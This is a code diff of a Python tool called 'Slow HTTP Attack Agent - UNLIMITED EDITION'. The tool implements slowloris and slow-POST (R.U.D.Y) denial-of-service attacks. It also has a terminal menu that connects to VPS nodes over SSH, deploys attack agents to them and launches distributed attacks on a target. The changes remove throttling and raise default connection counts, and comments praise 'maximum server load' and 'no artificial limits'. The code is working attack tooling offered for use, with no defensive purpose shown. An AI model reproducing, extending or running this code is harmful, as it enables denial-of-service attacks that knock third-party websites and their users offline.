@@ -92,7 +92,7 @@ class DatabaseManager:
             )
         ''')
         
-        # Attack sessions table
+        # Attack sessions table - TANPA total_connections
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS attack_sessions (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -105,13 +105,11 @@ class DatabaseManager:
                 end_time TIMESTAMP,
                 status TEXT DEFAULT 'pending',
                 parameters TEXT,
-                results TEXT,
-                total_connections INTEGER DEFAULT 0,
-                success_rate REAL DEFAULT 0.0
+                results TEXT
             )
         ''')
         
-        # Attack results table
+        # Attack results table - TANPA bytes_sent dan error_message
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS attack_results (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -120,9 +118,7 @@ class DatabaseManager:
                 timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 connections_active INTEGER DEFAULT 0,
                 packets_sent INTEGER DEFAULT 0,
-                bytes_sent INTEGER DEFAULT 0,
                 status TEXT,
-                error_message TEXT,
                 FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
             )
         ''')
@@ -201,14 +197,10 @@ class DatabaseManager:
         conn = sqlite3.connect(self.db_file)
         cursor = conn.cursor()
         
-        total_connections = len(vps_list) * parameters.get('connections', 100)
-        
         cursor.execute('''
-            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, 
-                                        parameters, start_time, status, total_connections)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), 
-              json.dumps(parameters), datetime.now().isoformat(), 'running', total_connections))
+            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), json.dumps(parameters), datetime.now().isoformat(), 'running'))
         
         session_id = cursor.lastrowid
         conn.commit()
@@ -224,6 +216,7 @@ class DatabaseManager:
         return sessions
     
     def log_attack_event(self, session_id, vps_ip, level, message):
+        """Log attack events"""
         conn = sqlite3.connect(self.db_file)
         cursor = conn.cursor()
         cursor.execute('''
@@ -234,6 +227,7 @@ class DatabaseManager:
         conn.close()
     
     def update_session_status(self, session_id, status, end_time=None):
+        """Update session status"""
         conn = sqlite3.connect(self.db_file)
         cursor = conn.cursor()
         
@@ -419,7 +413,7 @@ class SlowHTTPAttack:
         self.running=True
         start_time=time.time()
         
-        # Create initial connections
+        # UNLIMITED: Aggressive connection creation - no artificial limits
         print("[PHASE1] Creating initial connections...")
         for i in range(num_conns):
             if not self.running:
@@ -428,15 +422,17 @@ class SlowHTTPAttack:
             sock=self.create_socket()
             if sock:
                 try:
-                    # Full HTTP request with multiple headers
+                    # Full HTTP request with multiple headers for maximum server load
                     request = f"GET /?slowloris={random.randint(100000,999999)}&cache={time.time()} HTTP/1.1\\r\\n"
                     request += f"Host: {self.host}\\r\\n"
-                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\\r\\n"
-                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                    request += "Accept-Language: en-US,en;q=0.9\\r\\n"
+                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7\\r\\n"
                     request += "Accept-Encoding: gzip, deflate\\r\\n"
                     request += "Cache-Control: no-cache\\r\\n"
+                    request += "Pragma: no-cache\\r\\n"
                     request += "Connection: keep-alive\\r\\n"
+                    request += "Upgrade-Insecure-Requests: 1\\r\\n"
                     
                     # Convert escape sequences to actual bytes
                     request_bytes = request.encode().decode('unicode_escape').encode()
@@ -458,9 +454,9 @@ class SlowHTTPAttack:
                     except:
                         pass
             
-            # Small delay to avoid overwhelming
+            # MINIMAL DELAY - Maximum connection rate
             if i % 100 == 0:
-                time.sleep(0.01)
+                time.sleep(0.01)  # Very small delay only every 100 connections
         
         with self.lock:
             self.stats['active']=len(self.conns)
@@ -470,8 +466,8 @@ class SlowHTTPAttack:
             print("[ERROR] No connections established, aborting attack")
             return
         
-        # Keep connections alive phase
-        print("[PHASE2] Starting keep-alive phase...")
+        # Keep connections alive phase - AGGRESSIVE MODE
+        print("[PHASE2] Starting aggressive keep-alive phase...")
         cycle_count=0
         
         while self.running and self.conns:
@@ -483,9 +479,9 @@ class SlowHTTPAttack:
             cycle_count+=1
             active_before=len(self.conns)
             
-            # Send headers to keep connections alive
+            # Send multiple headers per connection for maximum server load
             failed_socks = []
-            headers_per_cycle = random.randint(2, 5)
+            headers_per_cycle = random.randint(2, 5)  # Multiple headers per cycle
             
             for sock in self.conns:
                 try:
@@ -505,7 +501,7 @@ class SlowHTTPAttack:
                     with self.lock:
                         self.stats['errors']+=1
             
-            # Replace failed connections
+            # Aggressive connection replacement - maintain connection count
             for sock in failed_socks:
                 if sock in self.conns:
                     self.conns.remove(sock)
@@ -514,8 +510,8 @@ class SlowHTTPAttack:
                 except:
                     pass
                 
-                # Try to replace lost connections
-                replacement_attempts = 3
+                # AGGRESSIVE: Always try to replace lost connections
+                replacement_attempts = 3  # Multiple attempts per failed connection
                 for attempt in range(replacement_attempts):
                     new_sock=self.create_socket()
                     if new_sock:
@@ -532,7 +528,7 @@ class SlowHTTPAttack:
                             self.conns.append(new_sock)
                             with self.lock:
                                 self.stats['sent']+=1
-                            break
+                            break  # Success, stop attempting
                         except Exception:
                             try:
                                 new_sock.close()
@@ -545,14 +541,14 @@ class SlowHTTPAttack:
                 sent = self.stats['sent']
                 errors = self.stats['errors']
             
-            print(f"[CYCLE {cycle_count}] Active: {active_after} | Headers sent: {sent} | Errors: {errors}")
+            print(f"[CYCLE {cycle_count}] Active: {active_after} | Headers sent: {sent} | Errors: {errors} | Replaced: {active_before-active_after if active_before > active_after else 0}")
             
-            # Variable delay
+            # VARIABLE DELAY for unpredictability
             sleep_time = random.uniform(delay * 0.5, delay * 1.5)
             time.sleep(sleep_time)
     
     def slow_post_attack(self,num_conns=50,delay=10,duration=0):
-        print(f"[SLOW POST] Starting attack on {self.host}:{self.port}")
+        print(f"[R.U.D.Y] Starting Slow POST attack on {self.host}:{self.port}")
         print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
         
         self.running=True
@@ -565,7 +561,7 @@ class SlowHTTPAttack:
                 return
             
             try:
-                # Large content-length
+                # UNLIMITED: Large content-length for maximum effectiveness
                 content_length=random.randint(10000000,100000000)  # 10MB to 100MB range
                 
                 # Proper HTTP POST format
@@ -574,8 +570,8 @@ class SlowHTTPAttack:
                 post_request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                 post_request += f"Content-Length: {content_length}\\r\\n"
                 post_request += "Connection: keep-alive\\r\\n"
-                post_request += "Expect: 100-continue\\r\\n"
-                post_request += "\\r\\n"
+                post_request += "Expect: 100-continue\\r\\n"  # Forces server to wait
+                post_request += "\\r\\n"  # End of headers
                 
                 # Convert escape sequences properly
                 post_bytes = post_request.encode().decode('unicode_escape').encode()
@@ -586,9 +582,9 @@ class SlowHTTPAttack:
                     
                 print(f"[WORKER {worker_id}] POST headers sent, content-length: {content_length:,} bytes")
                 
-                # Send POST data extremely slowly
+                # Send POST data extremely slowly - no artificial limits
                 bytes_sent=0
-                chunk_sizes=[1,2,3,4,5,6,7,8,9,10,15,20]
+                chunk_sizes=[1,2,3,4,5,6,7,8,9,10,15,20]  # Variable chunk sizes
                 
                 while self.running and bytes_sent < content_length:
                     # Check duration limit
@@ -596,7 +592,7 @@ class SlowHTTPAttack:
                         print(f"[WORKER {worker_id}] Duration limit reached")
                         break
                     
-                    # Variable chunk size
+                    # Variable chunk size for unpredictability
                     chunk_size = random.choice(chunk_sizes)
                     remaining = min(chunk_size, content_length - bytes_sent)
                     
@@ -617,8 +613,8 @@ class SlowHTTPAttack:
                         progress = (bytes_sent/content_length)*100
                         print(f"[WORKER {worker_id}] Progress: {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
                     
-                    # Slow transmission - The core of attack
-                    sleep_time = random.uniform(delay * 0.5, delay * 1.5)
+                    # SLOW TRANSMISSION - The core of R.U.D.Y
+                    sleep_time = random.uniform(delay * 0.5, delay * 1.5)  # Variable delay
                     time.sleep(sleep_time)
                 
                 print(f"[WORKER {worker_id}] Completed: {bytes_sent:,} bytes sent")
@@ -633,10 +629,11 @@ class SlowHTTPAttack:
                 except:
                     pass
         
-        # Start all worker threads
+        # NO THREAD LIMITS - Use all requested connections
         threads=[]
-        print(f"[THREADS] Starting {num_conns} worker threads...")
+        print(f"[THREADS] Starting {num_conns} R.U.D.Y worker threads...")
         
+        # Start all worker threads
         for i in range(num_conns):
             if not self.running:
                 break
@@ -644,7 +641,7 @@ class SlowHTTPAttack:
             thread.start()
             threads.append(thread)
             print(f"[THREAD {i+1}] Worker started")
-            time.sleep(0.1)
+            time.sleep(0.1)  # Small stagger to avoid overwhelming
         
         # Monitor all threads
         while self.running:
@@ -660,13 +657,13 @@ class SlowHTTPAttack:
                 sent = self.stats['sent']
                 errors = self.stats['errors']
             
-            print(f"[STATUS] Active workers: {active_threads}/{num_conns} | Total bytes sent: {sent:,} | Errors: {errors}")
+            print(f"[R.U.D.Y STATUS] Active workers: {active_threads}/{num_conns} | Total bytes sent: {sent:,} | Errors: {errors}")
             
             if active_threads == 0:
-                print("[COMPLETED] All workers finished")
+                print("[R.U.D.Y] All workers completed")
                 break
             
-            time.sleep(10)
+            time.sleep(10)  # Status update interval
     
     def stop_attack(self):
         print("[STOP] Stopping attack...")
@@ -681,7 +678,7 @@ class SlowHTTPAttack:
         self.conns.clear()
         print("[STOP] Attack stopped")
 
-# Global attacker instance
+# Better signal handling
 attacker = None
 
 def signal_handler(sig,frame):
@@ -695,16 +692,16 @@ def signal_handler(sig,frame):
 def main():
     global attacker
     
-    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent - Complete Version')
+    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent - UNLIMITED EDITION')
     parser.add_argument('target',help='Target URL or hostname')
     parser.add_argument('attack_type',choices=['slowloris','slow_post'],help='Type of attack to perform')
-    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100)')
-    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15)')
+    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100, no upper limit)')
+    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15, can be 0)')
     parser.add_argument('--duration','-t',type=int,default=0,help='Attack duration in seconds (0=unlimited, default: 0)')
     
     args=parser.parse_args()
     
-    # Validate arguments
+    # Validate arguments - REMOVED ARTIFICIAL LIMITS
     if args.connections < 1:
         print("ERROR: Connections must be at least 1")
         sys.exit(1)
@@ -716,7 +713,7 @@ def main():
     # Warning for very high connection counts
     if args.connections > 10000:
         print(f"WARNING: Very high connection count ({args.connections:,})")
-        print("This may overwhelm your system. Continue? (y/N)")
+        print("This may overwhelm your system or network. Continue? (y/N)")
         if input().strip().lower() != 'y':
             sys.exit(1)
     
@@ -736,7 +733,7 @@ def main():
             target_port=80
     
     print("="*80)
-    print("SLOW HTTP ATTACK AGENT - COMPLETE VERSION")
+    print("SLOW HTTP ATTACK AGENT - UNLIMITED EDITION")
     print("="*80)
     print(f"Target: {target_host}:{target_port}")
     print(f"Attack: {args.attack_type.upper()}")
@@ -867,7 +864,7 @@ class AttackManager:
         }
         
         print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
-        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 100)}{Colors.RESET}")
+        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 1000)}{Colors.RESET}")
         
         success_count = 0
         failed_vps = []
@@ -1203,15 +1200,13 @@ class SlowHTTPTUI:
             menu = f"""
 {Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
 {Colors.GREEN}[1]{Colors.RESET} Add VPS Node
-{Colors.GREEN}[2]{Colors.RESET} Bulk Add VPS
-{Colors.GREEN}[3]{Colors.RESET} Test All Connections
-{Colors.GREEN}[4]{Colors.RESET} Deploy Agents to All
-{Colors.GREEN}[5]{Colors.RESET} Remove VPS Node
-{Colors.GREEN}[6]{Colors.RESET} Test Single VPS
-{Colors.GREEN}[7]{Colors.RESET} Export VPS List
+{Colors.GREEN}[2]{Colors.RESET} Test All Connections
+{Colors.GREEN}[3]{Colors.RESET} Deploy Unlimited Agents to All
+{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
+{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
 {Colors.GREEN}[0]{Colors.RESET} Back to Main Menu
 
-{Colors.YELLOW}Select option (0-7): {Colors.RESET}"""
+{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
             
             print(menu)
             choice = input().strip()
@@ -1219,17 +1214,13 @@ class SlowHTTPTUI:
             if choice == '1':
                 self.add_vps()
             elif choice == '2':
-                self.bulk_add_vps()
-            elif choice == '3':
                 self.test_all_connections()
-            elif choice == '4':
+            elif choice == '3':
                 self.deploy_all_agents()
-            elif choice == '5':
+            elif choice == '4':
                 self.remove_vps()
-            elif choice == '6':
+            elif choice == '5':
                 self.test_single_vps()
-            elif choice == '7':
-                self.export_vps_list()
             elif choice == '0':
                 break
             else:
@@ -1274,7 +1265,8 @@ class SlowHTTPTUI:
                 success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                 
                 status = 'online' if success else 'offline'
-                self.db_manager.update_vps_status(ip, status)
+                agent_deployed = success  # Mark as deployed if connection successful
+                self.db_manager.update_vps_status(ip, status, agent_deployed)
                 
                 if success:
                     print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
@@ -1290,93 +1282,6 @@ class SlowHTTPTUI:
         
         input("Press Enter to continue...")
     
-    def bulk_add_vps(self):
-        print(f"\n{Colors.BOLD}BULK ADD VPS NODES{Colors.RESET}")
-        print("-" * 25)
-        
-        print(f"{Colors.CYAN}Format: ip:port:username:password:location{Colors.RESET}")
-        print(f"{Colors.CYAN}Example: 192.168.1.100:22:root:password123:USA{Colors.RESET}")
-        
-        method = input(f"\n{Colors.YELLOW}[1] Enter manually [2] Load from file: {Colors.RESET}").strip()
-        
-        entries = []
-        
-        if method == '1':
-            print(f"{Colors.YELLOW}Enter VPS details (empty line to finish):{Colors.RESET}")
-            while True:
-                entry = input("VPS: ").strip()
-                if not entry:
-                    break
-                entries.append(entry)
-        elif method == '2':
-            filename = input("Enter filename: ").strip()
-            try:
-                with open(filename, 'r') as f:
-                    entries = [line.strip() for line in f.readlines() if line.strip() and not line.startswith('#')]
-            except Exception as e:
-                print(f"{Colors.RED}[ERROR] Cannot read file: {e}{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-        
-        if not entries:
-            print(f"{Colors.YELLOW}[INFO] No entries provided{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        success_count = 0
-        for entry in entries:
-            try:
-                parts = entry.split(':')
-                if len(parts) < 4:
-                    print(f"{Colors.RED}[SKIP] Invalid format: {entry}{Colors.RESET}")
-                    continue
-                
-                ip = parts[0]
-                port = int(parts[1]) if parts[1] else 22
-                username = parts[2]
-                password = parts[3]
-                location = parts[4] if len(parts) > 4 else 'Unknown'
-                
-                encrypted_password = self.security_manager.encrypt_password(password)
-                
-                if self.db_manager.add_vps(ip, username, encrypted_password, port, location):
-                    print(f"{Colors.GREEN}[SUCCESS] Added {ip}{Colors.RESET}")
-                    success_count += 1
-                else:
-                    print(f"{Colors.RED}[FAILED] {ip} - Already exists or error{Colors.RESET}")
-                    
-            except Exception as e:
-                print(f"{Colors.RED}[ERROR] {entry} - {str(e)}{Colors.RESET}")
-        
-        print(f"\n{Colors.BOLD}Summary: {success_count}/{len(entries)} VPS added successfully{Colors.RESET}")
-        input("Press Enter to continue...")
-    
-    def export_vps_list(self):
-        vps_list = self.db_manager.get_all_vps()
-        
-        if not vps_list:
-            print(f"{Colors.YELLOW}[INFO] No VPS to export{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        filename = input(f"Export filename (default: vps_export.txt): ").strip() or "vps_export.txt"
-        
-        try:
-            with open(filename, 'w') as f:
-                f.write("# VPS Export - Format: ip:port:username:password:location\n")
-                f.write(f"# Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                for vps in vps_list:
-                    password = self.security_manager.decrypt_password(vps[3])
-                    location = vps[8] if vps[8] else "Unknown"
-                    f.write(f"{vps[1]}:{vps[4]}:{vps[2]}:{password}:{location}\n")
-            
-            print(f"{Colors.GREEN}[SUCCESS] VPS list exported to {filename}{Colors.RESET}")
-            
-        except Exception as e:
-            print(f"{Colors.RED}[ERROR] Export failed: {e}{Colors.RESET}")
-        
-        input("Press Enter to continue...")
-    
     def test_all_connections(self):
         """Enhanced connection testing with better error reporting"""
         vps_list = self.db_manager.get_all_vps()
@@ -1387,154 +1292,353 @@ class SlowHTTPTUI:
             return
         
         print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
-        print("-" * 50)
+        print("=" * 40)
         
-        online_count = 0
+        success_count = 0
+        failed_connections = []
+        
         for vps in vps_list:
             ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
-            print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
+            status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
+            status_text = vps[5]
             
-            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
+            print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET} ", end="", flush=True)
             
-            if success:
-                # Test command execution
-                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=10)
-                if cmd_success:
-                    print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
-                    self.db_manager.update_vps_status(ip, 'online')
-                    online_count += 1
-                else:
-                    print(f"{Colors.YELLOW}CONNECTED BUT CMD FAILED{Colors.RESET}")
-                    self.db_manager.update_vps_status(ip, 'online')
-            else:
-                print(f"{Colors.RED}OFFLINE - {message[:50]}{Colors.RESET}")
-                self.db_manager.update_vps_status(ip, 'offline')
-        
-        print(f"\n{Colors.BOLD}Summary: {online_count}/{len(vps_list)} VPS online{Colors.RESET}")
-        input("\nPress Enter to continue...")
-    
-    def test_single_vps(self):
-        vps_list = self.db_manager.get_all_vps()
-        
-        if not vps_list:
-            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
-        print("-" * 20)
-        
-        for i, vps in enumerate(vps_list, 1):
-            print(f"{i}. {vps[1]} ({vps[2]}@{vps[1]}:{vps[4]})")
-        
-        try:
-            choice = self.input_with_prompt("Select VPS number: ")
-            if not choice or not choice.isdigit():
-                return
-            
-            idx = int(choice) - 1
-            if 0 <= idx < len(vps_list):
-                vps = vps_list[idx]
-                ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
-                
-                print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
-                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
-                
-                if success:
-                    print(f"{Colors.GREEN}[SUCCESS] Connection established{Colors.RESET}")
-                    
-                    # Test command execution
-                    print(f"{Colors.CYAN}[TESTING] Command execution...{Colors.RESET}")
-                    success, output = self.ssh_manager.execute_command(ip, "whoami && pwd && python3 --version")
-                    
-                    if success:
-                        print(f"{Colors.GREEN}[SUCCESS] Command execution test passed{Colors.RESET}")
-                        print(f"Output: {output}")
-                    else:
-                        print(f"{Colors.RED}[ERROR] Command execution failed: {output}{Colors.RESET}")
-                    
-                    self.db_manager.update_vps_status(ip, 'online')
-                else:
-                    print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
-                    self.db_manager.update_vps_status(ip, 'offline')
-            else:
-                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
-                
-        except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
-        except Exception as e:
-            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
-        
-        input("Press Enter to continue...")
-    
-    def deploy_all_agents(self):
-        vps_list = self.db_manager.get_all_vps()
-        online_vps = [vps for vps in vps_list if vps[5] == 'online']
-        
-        if not online_vps:
-            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL ONLINE VPS{Colors.RESET}")
-        print("-" * 50)
-        
-        successful_deployments = 0
-        for vps in online_vps:
-            ip = vps[1]
-            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
-            
-            success, message = self.ssh_manager.deploy_agent(ip)
+            # Test connection
+            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
             
             if success:
                 print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
-                successful_deployments += 1
-                self.db_manager.update_vps_status(ip, 'online', agent_deployed=True)
+                success_count += 1
+                self.db_manager.update_vps_status(ip, 'online', True)
             else:
-                print(f"{Colors.RED}FAILED - {message}{Colors.RESET}")
+                print(f"{Colors.RED}FAILED{Colors.RESET}")
+                failed_connections.append(f"{ip}: {message}")
+                self.db_manager.update_vps_status(ip, 'offline', False)
         
-        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} agents deployed successfully{Colors.RESET}")
+        print(f"\n{Colors.BOLD}CONNECTION TEST RESULTS{Colors.RESET}")
+        print("=" * 40)
+        print(f"{Colors.GREEN}[SUCCESS] {success_count} connections working{Colors.RESET}")
+        
+        if failed_connections:
+            print(f"{Colors.RED}[FAILED] {len(failed_connections)} connections failed{Colors.RESET}")
+            print("\nFailed connections:")
+            for failure in failed_connections:
+                print(f"  {failure}")
+        
         input("\nPress Enter to continue...")
     
-    def remove_vps(self):
+    def deploy_all_agents(self):
+        """Deploy agents to all VPS nodes"""
         vps_list = self.db_manager.get_all_vps()
         
         if not vps_list:
-            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
+            print(f"{Colors.YELLOW}[INFO] No VPS nodes configured{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL VPS NODES{Colors.RESET}")
+        print("=" * 50)
+        
+        success_count = 0
+        failed_deployments = []
+        
+        for vps in vps_list:
+            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
+            
+            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
+            
+            # First ensure connection
+            if not self.ssh_manager.get_connection_status(ip):
+                print(f"{Colors.YELLOW}CONNECTING...{Colors.RESET} ", end="", flush=True)
+                connect_success, connect_msg = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
+                
+                if not connect_success:
+                    print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
+                    failed_deployments.append(f"{ip}: Connection failed - {connect_msg}")
+                    continue
+                else:
+                    print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
+            
+            # Deploy agent
+            deploy_success, deploy_msg = self.ssh_manager.deploy_agent(ip)
+            
+            if deploy_success:
+                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
+                success_count += 1
+                self.db_manager.update_vps_status(ip, 'online', True)
+            else:
+                print(f"{Colors.RED}FAILED{Colors.RESET}")
+                failed_deployments.append(f"{ip}: {deploy_msg}")
+                self.db_manager.update_vps_status(ip, 'offline', False)
+        
+        print(f"\n{Colors.BOLD}AGENT DEPLOYMENT RESULTS{Colors.RESET}")
+        print("=" * 50)
+        print(f"{Colors.GREEN}[SUCCESS] {success_count} agents deployed{Colors.RESET}")
+        
+        if failed_deployments:
+            print(f"{Colors.RED}[FAILED] {len(failed_deployments)} deployments failed{Colors.RESET}")
+            print("\nFailed deployments:")
+            for failure in failed_deployments:
+                print(f"  {failure}")
+        
+        input("\nPress Enter to continue...")
+    
+    def remove_vps(self):
+        """Remove VPS node from database"""
+        vps_list = self.db_manager.get_all_vps()
+        
+        if not vps_list:
+            print(f"{Colors.YELLOW}[INFO] No VPS nodes configured{Colors.RESET}")
             input("Press Enter to continue...")
             return
         
         print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
-        print("-" * 20)
+        print("=" * 30)
         
-        for i, vps in enumerate(vps_list, 1):
-            print(f"{i}. {vps[1]} ({vps[8] or 'Unknown'})")
+        print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Agent':<8} {'Location':<15}")
+        print("-" * 75)
+        
+        for vps in vps_list:
+            status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
+            agent_color = Colors.GREEN if len(vps) > 10 and vps[10] else Colors.RED
+            agent_status = "YES" if len(vps) > 10 and vps[10] else "NO"
+            location = vps[8] if vps[8] else 'Unknown'
+            
+            print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {agent_color}{agent_status:<8}{Colors.RESET} {location:<15}")
         
         try:
-            choice = self.input_with_prompt("Select VPS number to remove: ")
-            if not choice or not choice.isdigit():
+            choice = input(f"\n{Colors.CYAN}Enter VPS ID to remove (or 0 to cancel): {Colors.RESET}").strip()
+            
+            if choice == '0':
                 return
             
-            idx = int(choice) - 1
-            if 0 <= idx < len(vps_list):
-                vps = vps_list[idx]
-                
-                confirm = input(f"{Colors.YELLOW}Remove VPS {vps[1]}? (y/N): {Colors.RESET}").strip().lower()
+            vps_id = int(choice)
+            vps_to_remove = next((vps for vps in vps_list if vps[0] == vps_id), None)
+            
+            if vps_to_remove:
+                ip = vps_to_remove[1]
+                confirm = input(f"{Colors.YELLOW}Are you sure you want to remove VPS {ip}? (y/N): {Colors.RESET}").strip().lower()
                 
                 if confirm == 'y':
-                    # Disconnect if connected
-                    self.ssh_manager.disconnect_vps(vps[1])
+                    success = self.db_manager.remove_vps(ip)
                     
-                    # Remove from database
-                    if self.db_manager.remove_vps(vps[1]):
-                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
+                    if success:
+                        print(f"{Colors.GREEN}[SUCCESS] VPS {ip} removed from database{Colors.RESET}")
+                        
+                        # Also disconnect if connected
+                        if self.ssh_manager.get_connection_status(ip):
+                            self.ssh_manager.disconnect_vps(ip)
                     else:
-                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
+                        print(f"{Colors.RED}[ERROR] Failed to remove VPS {ip}{Colors.RESET}")
                 else:
                     print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
             else:
-                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
+                print(f"{Colors.RED}[ERROR] Invalid VPS ID{Colors.RESET}")
                 
+        except ValueError:
+            print(f"{Colors.RED}[ERROR] Invalid input{Colors.RESET}")
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
+        
+        input("Press Enter to continue...")
+    
+    def test_single_vps(self):
+        """Test connection to a single VPS node"""
+        vps_list = self.db_manager.get_all_vps()
+        
+        if not vps_list:
+            print(f"{Colors.YELLOW}[INFO] No VPS nodes configured{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        print(f"\n{Colors.BOLD}TEST SINGLE VPS CONNECTION{Colors.RESET}")
+        print("=" * 40)
+        
+        print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Agent':<8} {'Location':<15}")
+        print("-" * 75)
+        
+        for vps in vps_list:
+            status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
+            agent_color = Colors.GREEN if len(vps) > 10 and vps[10] else Colors.RED
+            agent_status = "YES" if len(vps) > 10 and vps[10] else "NO"
+            location = vps[8] if vps[8] else 'Unknown'
+            
+            print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {agent_color}{agent_status:<8}{Colors.RESET} {location:<15}")
+        
+        try:
+            choice = input(f"\n{Colors.CYAN}Enter VPS ID to test (or 0 to cancel): {Colors.RESET}").strip()
+            
+            if choice == '0':
+                return
+            
+            vps_id = int(choice)
+            vps_to_test = next((vps for vps in vps_list if vps[0] == vps_id), None)
+            
+            if vps_to_test:
+                ip, username, encrypted_password, port = vps_to_test[1], vps_to_test[2], vps_to_test[3], vps_to_test[4]
+                
+                print(f"\n{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
+                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
+                
+                if success:
+                    print(f"{Colors.GREEN}[SUCCESS] Connection to {ip} established{Colors.RESET}")
+                    self.db_manager.update_vps_status(ip, 'online', True)
+                    
+                    # Test command execution
+                    print(f"{Colors.CYAN}[EXECUTING] Test command...{Colors.RESET}")
+                    test_success, test_output = self.ssh_manager.execute_command(ip, "echo 'Test successful' && whoami")
+                    
+                    if test_success:
